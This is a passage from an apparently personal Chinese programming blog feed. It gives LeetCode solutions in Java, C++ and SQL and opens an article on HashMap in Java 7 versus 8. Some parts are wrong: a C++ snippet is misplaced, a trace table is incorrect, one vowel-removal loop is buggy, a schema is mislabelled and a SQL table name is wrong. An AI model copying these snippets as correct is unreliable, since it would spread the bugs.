<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> j = A.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">				i++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[j] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">				j--;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">				<span class="keyword">int</span> temp = A[i];</span><br><span class="line">				A[i++] = A[j];</span><br><span class="line">				A[j--] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> A;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = A.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[j] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = A[i];</span><br><span class="line">                A[i++] = A[j];</span><br><span class="line">                A[j--] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>遍历一次，但是用一个位置索引。在遍历的过程中，用一个oddIndex 保存当前偶数的位置索引，从0开始。因为题目要求先输出偶数，后输出奇数。然后遍历数组，在遍历的过程中，如果发现当前遍历的数为偶数，则和oddIndex上的值做交换，然后oddIndex自增。</p>
<p>以数组4，2，1，3为例，</p>
<table>
<thead>
<tr>
<th></th>
<th>数组</th>
<th>oddIndex</th>
<th>index</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>4，2，1，3</td>
<td>0</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>开始循环，第一步</td>
<td>4，2，1，3</td>
<td>1</td>
<td>1</td>
<td>index为0的位置上为偶数，和oddIndex做交换</td>
</tr>
<tr>
<td>第二步</td>
<td>4，2，1，3</td>
<td>2</td>
<td>2</td>
<td>index为1的位置上为偶数，和oddIndex做交换</td>
</tr>
<tr>
<td>第三步</td>
<td>4，2，1，3</td>
<td>2</td>
<td>3</td>
<td>没有匹配到偶数</td>
</tr>
</tbody></table>
<p>以数组1，2，3，4为例</p>
<table>
<thead>
<tr>
<th></th>
<th>数组</th>
<th>oddIndex</th>
<th>index</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>1，2，3，4</td>
<td>0</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>开始循环，第一步</td>
<td>1，2，3，4</td>
<td>0</td>
<td>1</td>
<td>index为0的位置上为奇数，继续</td>
</tr>
<tr>
<td>第二步</td>
<td>2，1，3，4</td>
<td>1</td>
<td>2</td>
<td>index为1的位置上为偶数，和oddIndex做交换</td>
</tr>
<tr>
<td>第三步</td>
<td>2，1，3，4</td>
<td>1</td>
<td>3</td>
<td>index为2的位置上为奇数，继续</td>
</tr>
<tr>
<td>第四步</td>
<td>2，4，3，1</td>
<td>2</td>
<td>4</td>
<td>index3的位置上为奇数，和oddIndex做交换</td>
</tr>
</tbody></table>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> oddIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> temp = A[i];</span><br><span class="line">                A[i] = A[oddIndex];</span><br><span class="line">                A[oddIndex] = temp;</span><br><span class="line">                oddIndex++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s=<span class="string">""</span>;</span><br><span class="line">        <span class="built_in">string</span> str=<span class="string">"[.]"</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; address.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = address[i];</span><br><span class="line">            <span class="keyword">if</span>(address[i] == <span class="string">'.'</span>) &#123;</span><br><span class="line">                s.append(str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s += c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1108. Defanging an IP Address</title>
    <url>/2020/03/18/LeetCode/leetcode-001108.%20Defanging%20an%20IP%20Address/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a valid (IPv4) IP <code>address</code>, return a defanged version of that IP address.</p>
<p>A <em>defanged IP address</em> replaces every period <code>&quot;.&quot;</code> with <code>&quot;[.]&quot;</code>.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: address &#x3D; &quot;1.1.1.1&quot;</span><br><span class="line">Output: &quot;1[.]1[.]1[.]1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: address = <span class="string">"255.100.50.0"</span></span><br><span class="line">Output: <span class="string">"255[.]100[.]50[.]0"</span></span><br></pre></td></tr></table></figure>

<h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints"></a>Constraints</h3><p>The given <code>address</code> is a valid IPv4 address.</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用正则表达式替换。将 <code>.</code> 全部替换为 <code>[.]</code></p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">defangIPaddr</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address.replaceAll(<span class="string">"\\."</span>, <span class="string">"[.]"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>构造一个新的返回字符。遍历当前字符串，如果当前字符串为<code>.</code>，则在它的前后追加<code>[</code>,<code>]</code>即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">defangIPaddr</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">char</span>[] arr = address.toCharArray();</span><br><span class="line">        <span class="keyword">char</span> left = <span class="string">'['</span>;</span><br><span class="line">        <span class="keyword">char</span> right = <span class="string">']'</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] != <span class="string">'.'</span>)&#123;</span><br><span class="line">                result += arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                result = result + left + arr[i] + right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s=<span class="string">""</span>;</span><br><span class="line">        <span class="built_in">string</span> str=<span class="string">"[.]"</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; address.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = address[i];</span><br><span class="line">            <span class="keyword">if</span>(address[i] == <span class="string">'.'</span>) &#123;</span><br><span class="line">                s.append(str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s += c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1119. Remove Vowels from a String</title>
    <url>/2020/03/18/LeetCode/leetcode-001119.%20Remove%20Vowels%20from%20a%20String/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string <code>S</code>, remove the vowels <code>&#39;a&#39;</code>, <code>&#39;e&#39;</code>, <code>&#39;i&#39;</code>, <code>&#39;o&#39;</code>, and <code>&#39;u&#39;</code> from it, and return the new string.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;leetcodeisacommunityforcoders&quot;</span><br><span class="line">Output: &quot;ltcdscmmntyfrcdrs&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"aeiou"</span></span><br><span class="line">Output: <span class="string">""</span></span><br></pre></td></tr></table></figure>

<h3 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h3><ol>
<li><code>S</code> consists of lowercase English letters only.</li>
<li></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;&#x3D; S.length &lt;&#x3D; 1000</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用字符串的replace方法，将所有元音字母替换成””。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">String <span class="title">removeVowel</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> str.replaceAll(<span class="string">"a"</span>, <span class="string">""</span>).replaceAll(<span class="string">"e"</span>, <span class="string">""</span>).replaceAll(<span class="string">"i"</span>, <span class="string">""</span>).replaceAll(<span class="string">"o"</span>, <span class="string">""</span>).replaceAll(<span class="string">"u"</span>, <span class="string">""</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">remVowel</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels = &#123;<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(vowels.<span class="built_in">begin</span>(), vowels.<span class="built_in">end</span>(), str[i]) != vowels.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                str = str.replace(i, <span class="number">1</span>, <span class="string">""</span>);</span><br><span class="line">                i -= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>所有元音作为一个集合，遍历s里面的所有字符，遇到元音就跳过，最后构造一个新的字符串返回</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">String <span class="title">removeVowel</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		Set&lt;Character&gt; vowels = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		vowels.add(<span class="string">'a'</span>);</span><br><span class="line">		vowels.add(<span class="string">'e'</span>);</span><br><span class="line">		vowels.add(<span class="string">'i'</span>);</span><br><span class="line">		vowels.add(<span class="string">'o'</span>);</span><br><span class="line">		vowels.add(<span class="string">'u'</span>);</span><br><span class="line">		</span><br><span class="line">		StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (vowels.contains(c)) &#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			stringBuilder.append(c);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">remVowel</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels = &#123;<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>&#125;;</span><br><span class="line">        <span class="built_in">string</span> result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(vowels.<span class="built_in">begin</span>(), vowels.<span class="built_in">end</span>(), str[i]) == vowels.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                result += str.at(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Strings</tag>
      </tags>
  </entry>
  <entry>
    <title>1350. Students With Invalid Departments</title>
    <url>/2020/03/18/LeetCode/leetcode-001350.%20Students%20With%20Invalid%20Departments%20/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>Table: Departments</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">id is the primary key of this table.</span><br><span class="line">The table has information about the id of each department of a university.</span><br></pre></td></tr></table></figure>

<p><strong>Table: Students</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| unique_id     | int     |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">(id, unique_id) is the primary key for this table.</span><br><span class="line">Each row of this table contains the id and the corresponding unique id of an employee in the company.</span><br></pre></td></tr></table></figure>

<p>Write an SQL query to find the id and the name of all students who are enrolled in departments that no longer exists.</p>
<p>Return the result table in any order.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Departments table:</span><br><span class="line">+------+--------------------------+</span><br><span class="line">| id   | name                     |</span><br><span class="line">+------+--------------------------+</span><br><span class="line">| 1    | Electrical Engineering   |</span><br><span class="line">| 7    | Computer Engineering     |</span><br><span class="line">| 13   | Bussiness Administration |</span><br><span class="line">+------+--------------------------+</span><br><span class="line"></span><br><span class="line">Students table:</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| id   | name     | department_id |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| 23   | Alice    | 1             |</span><br><span class="line">| 1    | Bob      | 7             |</span><br><span class="line">| 5    | Jennifer | 13            |</span><br><span class="line">| 2    | John     | 14            |</span><br><span class="line">| 4    | Jasmine  | 77            |</span><br><span class="line">| 3    | Steve    | 74            |</span><br><span class="line">| 6    | Luis     | 1             |</span><br><span class="line">| 8    | Jonathan | 7             |</span><br><span class="line">| 7    | Daiana   | 33            |</span><br><span class="line">| 11   | Madelynn | 1             |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line"></span><br><span class="line">Result table:</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | name     |</span><br><span class="line">+------+----------+</span><br><span class="line">| 2    | John     |</span><br><span class="line">| 7    | Daiana   |</span><br><span class="line">| 4    | Jasmine  |</span><br><span class="line">| 3    | Steve    |</span><br><span class="line">+------+----------+</span><br><span class="line"></span><br><span class="line">John, Daiana, Steve and Jasmine are enrolled in departments 14, 33, 74 and 77 respectively. department 14, 33, 74 and 77 doesn&#39;t exist in the Departments table.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>题目大意就是找过所有没有注册过公寓的学生。即该学生的公寓不在给定的公寓中。</p>
<p>用子查询</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select id, <span class="function">name from Students where department_id not <span class="title">in</span> <span class="params">(select id from Departments)</span></span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>1378. Replace Employee ID With The Unique Identifier</title>
    <url>/2020/03/18/LeetCode/leetcode-001378.%20Replace%20Employee%20ID%20With%20The%20Unique%20Identifier/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>Table: Employees</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">id is the primary key for this table.</span><br><span class="line">Each row of this table contains the id and the name of an employee in a company.</span><br></pre></td></tr></table></figure>

<p><strong>Table: EmployeeUNI</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| unique_id     | int     |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">(id, unique_id) is the primary key for this table.</span><br><span class="line">Each row of this table contains the id and the corresponding unique id of an employee in the company.</span><br></pre></td></tr></table></figure>

<p>Write an SQL query to show the unique ID of each user, If a user doesn’t have a unique ID replace just show null.</p>
<p>Return the result table in any order.</p>
<p>The query result format is in the following example:</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Employees table:</span><br><span class="line">+----+----------+</span><br><span class="line">| id | name     |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Alice    |</span><br><span class="line">| 7  | Bob      |</span><br><span class="line">| 11 | Meir     |</span><br><span class="line">| 90 | Winston  |</span><br><span class="line">| 3  | Jonathan |</span><br><span class="line">+----+----------+</span><br><span class="line"></span><br><span class="line">EmployeeUNI table:</span><br><span class="line">+----+-----------+</span><br><span class="line">| id | unique_id |</span><br><span class="line">+----+-----------+</span><br><span class="line">| 3  | 1         |</span><br><span class="line">| 11 | 2         |</span><br><span class="line">| 90 | 3         |</span><br><span class="line">+----+-----------+</span><br><span class="line"></span><br><span class="line">EmployeeUNI table:</span><br><span class="line">+-----------+----------+</span><br><span class="line">| unique_id | name     |</span><br><span class="line">+-----------+----------+</span><br><span class="line">| null      | Alice    |</span><br><span class="line">| null      | Bob      |</span><br><span class="line">| 2         | Meir     |</span><br><span class="line">| 3         | Winston  |</span><br><span class="line">| 1         | Jonathan |</span><br><span class="line">+-----------+----------+</span><br><span class="line"></span><br><span class="line">Alice and Bob don&#39;t have a unique ID, We will show null instead.</span><br><span class="line">The unique ID of Meir is 2.</span><br><span class="line">The unique ID of Winston is 3.</span><br><span class="line">The unique ID of Jonathan is 1.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>左连接就会以左表Employee为准，将id相同的unique_id  select 出来，如果在EmployeeUNI表中没有id对应的unique_id则返回null。</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select unique_id, name from Employees left join EmployeeUNI on Employee.id = EmployeeUNI.id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>HashMap在Java7和8中的区别</title>
    <url>/2020/03/18/Java/Java%E5%9F%BA%E7%A1%80/HashMap%E5%9C%A8Java7%E5%92%8CJava8%E4%B8%AD%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="HashMap解析"><a href="#HashMap解析" class="headerlink" title="HashMap解析"></a>HashMap解析</h1><p>本文不会对HashMap的源码或者原理什么的进行分析，就针对Java7/8中HashMap的不同之处进行分析。</p>
<h2 id="Java-7中的HashMap"><a href="#Java-7中的HashMap" class="headerlink" title="Java 7中的HashMap"></a>Java 7中的HashMap</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>HashMap在Java7中的底层结构为Entry对象。它的具体定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">        <span class="keyword">int</span> hash;<span class="comment">//对key的hashcode值进行hash运算后得到的值，存储在Entry，避免重复计算</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Creates new entry.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Entry(<span class="keyword">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">            value = v;</span><br><span class="line">            next = n;</span><br><span class="line">            key = k;</span><br><span class="line">            hash = h;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>具体的数据结构如下：</p>
<p><img src="https://huhansi.github.io/images/20200320-java7-hashmap.png" alt="Java 7中的HashMap"></p>
<p>在Java7中，当成百上千个节点在hash时发生碰撞，这些节点都会存储在一个链表中。如果要查找这个链表中的某一个节点，就要花费O(N)的查找时间。</p>
<h3 id="发生冲突时"><a href="#发生冲突时" class="headerlink" title="发生冲突时"></a>发生冲突时</h3><p>在Java 7 中发生冲突的时候，会将新的冲突节点插入到对应链表的头节点位置。这样就会在多线程情况下存在一个死循环的问题。因为，在扩容的时候，原先的链表会逆序将节点插入到新HashMap的链表中去，这种情况下就存在节点循环引用的可能。最后导致get的时候，死循环。</p>
<h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>在扩容resize过程中，采用单链表的头插入方式，在将旧数组上的数据 转移到 新数组上时，转移操作 = 按旧链表的正序遍历链表、在新链表的头部依次插入，即在转移数据、扩容后，容易出现链表逆序的情况 。 多线程下resize()容易出现死循环。此时若（多线程）并发执行 put（）操作，一旦出现扩容情况，则 容易出现 环形链表，从而在获取数据、遍历链表时 形成死循环（Infinite Loop），即 死锁的状态 。</p>
<h2 id="Java-8中的HashMap"><a href="#Java-8中的HashMap" class="headerlink" title="Java 8中的HashMap"></a>Java 8中的HashMap</h2><h3 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h3><p>HashMap在Java 8中使用了和ConcurrentHashMap一样的Node节点作为底层存贮的数据结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = hash;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">"="</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> 